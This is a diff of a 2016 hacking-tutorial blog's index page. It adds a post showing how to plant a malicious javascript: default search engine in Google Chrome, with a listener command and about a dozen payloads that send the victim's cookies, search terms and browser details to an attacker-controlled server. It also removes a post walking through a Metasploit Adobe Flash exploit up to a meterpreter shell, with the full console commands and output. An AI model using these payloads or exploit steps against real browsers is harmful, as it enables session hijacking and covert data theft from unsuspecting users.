@@ -14,6 +14,78 @@
 <div id="description">Hacking tutorials + info</div>
 </div></div></div>
 <div id="divbody"><div class="content">
+<h3><a class="ablack" href="google-chrome-search-poison---default-search-engine-exploit.html">
+Google Chrome Search Poison – Default Search Engine Exploit
+</a></h3>
+<!-- bashblog_timestamp: #201607021941.50# -->
+<div class="subtitle">July 02, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+
+<h2>Introduction</h2>
+
+<p>In December 2015, I discovered a vulnerability in Google Chrome's (Chromium included) default search engines feature, whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser.<br>
+In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.</p>
+
+<h2>Video Demo</h2>
+
+<p><a href="https://www.youtube.com/watch?v=WoF-LkA6fMk">https://www.youtube.com/watch?v=WoF-LkA6fMk</a><br>
+The video demonstration involves manipulation of the chrome master-preferences file to infect the user with the malicious search engine. The user is then directed to the attackers apache server, which extracts the search query, cookies and other system information and seamlessly directs them back to their search.</p>
+
+<h2>Setting up the Listener in Kali</h2>
+
+<p><code></p>
+
+<div class="code">
+root@kali:~$ <com>python -m SimpleHTTPServer 80</com>
+</div>
+
+<p></code></p>
+
+<h2>Setup on Victim Machine</h2>
+
+<ol>
+<li>Go into <strong>"Settings"</strong> in Google Chrome<br></li>
+<li>Click on <strong>"Manage Search Engines"</strong><br></li>
+<li>Enter your malicious JS and click <strong>"Make Default"</strong><br></li>
+</ol>
+
+<h2>Example</h2>
+
+<p><code></p>
+
+<div class="code">
+<com>javascript:window.location='http://192.168.1.182/%s'+escape(document.cookie);</com>
+</div>
+
+<p></code>
+Note: 192.168.1.182 is our SimpleHTTPServer.<br>
+Now whenever the victim searches using Google Chrome’s Omnibox, the malicious JS will trigger, forwarding you their cookie and search string (%s).<br></p>
+
+<h2>Other examples</h2>
+
+<p><code></p>
+
+<div class="code">
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.cookie);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.baseURI);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.domain);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.URL);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(location.host);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appCodeName);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appName);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appVersion);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.userAgent);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.product);
+</div>
+
+<p></code></p>
+
+<p>Tags: <a href='tag_search-poison.html'>search-poison</a></p>
+<!-- text end -->
 <h3><a class="ablack" href="unrealircd-3281-backdoor-command-execution.html">
 UnrealIRCD 3.2.8.1 Backdoor Command Execution
 </a></h3>
@@ -75,6 +147,7 @@ root@metasploitable:/etc/unreal#
 <p></code></p>
 
 <p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+
 <!-- text end -->
 <h3><a class="ablack" href="vsftpd-v234-backdoor-command-execution.html">
 VSFTPD v2.3.4 Backdoor Command Execution
@@ -122,6 +195,7 @@ root@metasploitable:/#
 <p></code></p>
 
 <p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+
 <!-- text end -->
 <h3><a class="ablack" href="linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html">
 Linux Kernel 2.6 UDEV &lt; 141 – Local Privilege Escalation Exploit Example
@@ -218,6 +292,7 @@ root
 <p></code></p>
 
 <p>Tags: <a href='tag_privilege-escalation.html'>privilege-escalation</a></p>
+
 <!-- text end -->
 <h3><a class="ablack" href="shellshock-explained--exploitation-tutorial.html">
 Shellshock Explained + Exploitation Tutorial
@@ -345,6 +420,7 @@ Additional attack vectors include:<br>
 If your system is vulnerable, ensure it is patched immediately by upgrading your version of Bash then re-testing.</p>
 
 <p>Tags: <a href='tag_shellshock.html'>shellshock</a></p>
+
 <!-- text end -->
 <h3><a class="ablack" href="shellter---the-ultimate-tool-for-av-evasion.html">
 Shellter – The ultimate tool for AV evasion
@@ -460,6 +536,7 @@ C:\7-ZipPortable>
 <p></code></p>
 
 <p>Tags: <a href='tag_av-evasion.html'>av-evasion</a></p>
+
 <!-- text end -->
 <h3><a class="ablack" href="increasing-the-power-output-of-your-alfa-awus036h.html">
 Increasing the Power Output of your Alfa AWUS036H
@@ -517,6 +594,7 @@ We have successfully set txpower to 30dBM (1-Watt).<br>
 Higher values can also be set and detailed instructions are available at Null Byte (<a href="http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/">http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/</a>).</p>
 
 <p>Tags: <a href='tag_wifi.html'>wifi</a></p>
+
 <!-- text end -->
 <h3><a class="ablack" href="metasploit-browser-autopwn---windows-xp-sp2.html">
 Metasploit Browser Autopwn – Windows XP SP2
@@ -587,78 +665,7 @@ You now have shell access to the Windows XP SP3 Victim with the same access as t
 <p>Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.</p>
 
 <p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
-<!-- text end -->
-<h3><a class="ablack" href="metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html">
-Metasploit Adobe Flash 18.0.0.203 Exploit – Windows 7 / Windows 8.1
-</a></h3>
-<!-- bashblog_timestamp: #201607011506.44# -->
-<div class="subtitle">July 01, 2016 &mdash; 
-metalkey
-</div>
-<!-- text begin -->
-<strong>Attacker:</strong> Kali Linux<br>
-<strong>Victim:</strong> Windows 7 Enterprise 32-bit (Adobe Flashplayer 18.0.0.203, Firefox 39)</p>
 
-<h2>Step 1 – Starting the Exploit Server</h2>
-
-<p>Run msfconsole, load adobe-flash-opaque-background-uaf and set all required options.
-<code></p>
-
-<div class="code">
-root@kali:~$ <com>msfconsole</com><br>
-msf > <com>use exploit/multi/browser/adobe_flash_opaque_background_uaf</com><br>
-msf exploit(adobe_flash_opaque_background_uaf) > <com>set SRVPORT 80</com><br>
-msf exploit(adobe_flash_opaque_background_uaf) > <com>set URIPATH /</com><br>
-msf exploit(adobe_flash_opaque_background_uaf) > <com>exploit</com><br>
-[*] Local IP: http://192.168.1.12:80/<br>
-[*] Server started.<br>
-</div>
-
-<p></code></p>
-
-<h2>Step 2 – Exploiting the Victim Machine</h2>
-
-<p>On your Windows test machine (victim), start Firefox and browse to http://192.168.1.12.<br>
-This will trigger the adobe-flash-opaque-background-uaf exploit and launch a meterpreter session.<br>
-<code></p>
-
-<div class="code">
-[*] 192.168.1.11 adobe_flash_opaque_background_uaf - Sending SWF...<br>
-[*] Sending stage (885806 bytes) to 192.168.1.11<br>
-[*] Meterpreter session 1 opened (192.168.1.12:4444 -> 192.168.1.11:49297) at 2015-08-01 04:39:34 -0400<br>
-msf exploit(adobe_flash_opaque_background_uaf) > <com>sessions -i 1</com><br>
-[*] Starting interaction with 1...<br>
-<br>
-meterpreter > <com>getuid</com><br>
-Server username: IE8Win7\IEUser<br>
-meterpreter > <com>ls</com><br>
-Listing: C:\<br>
-============<br>
-<br>
-Mode Size Type Last modified Name<br>
----- ---- ---- ------------- ----<br>
-40777/rwxrwxrwx 0 dir 2013-10-23 12:22:56 -0400 $Recycle.Bin<br>
-40777/rwxrwxrwx 0 dir 2009-07-14 00:53:55 -0400 Documents and Settings<br>
-40777/rwxrwxrwx 0 dir 2009-07-13 22:37:05 -0400 PerfLogs<br>
-40555/r-xr-xr-x 0 dir 2015-08-01 03:32:42 -0400 Program Files<br>
-40777/rwxrwxrwx 0 dir 2015-08-01 03:32:42 -0400 ProgramData<br>
-40777/rwxrwxrwx 0 dir 2013-10-23 12:22:42 -0400 Recovery<br>
-40777/rwxrwxrwx 0 dir 2014-11-26 14:57:05 -0500 System Volume Information<br>
-40555/r-xr-xr-x 0 dir 2013-10-23 12:22:47 -0400 Users<br>
-40777/rwxrwxrwx 0 dir 2013-10-23 17:52:20 -0400 Wallpaper<br>
-40777/rwxrwxrwx 0 dir 2015-08-01 03:20:08 -0400 Windows<br>
-100777/rwxrwxrwx 24 fil 2009-06-10 17:42:20 -0400 autoexec.bat<br>
-100666/rw-rw-rw- 10 fil 2009-06-10 17:42:20 -0400 config.sys<br>
-100666/rw-rw-rw- 1073741824 fil 2015-08-01 04:01:24 -0400 pagefile.sys<br>
-</div>
-
-<p></code></p>
-
-<h2>Solution</h2>
-
-<p>Uninstall flashplayer.</p>
-
-<p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
 <!-- text end -->
 <div id="all_posts"><a href="all_posts.html">View more posts</a> &mdash; <a href="all_tags.html">All tags</a> &mdash; <a href="feed.rss">Subscribe</a></div>
 </div>
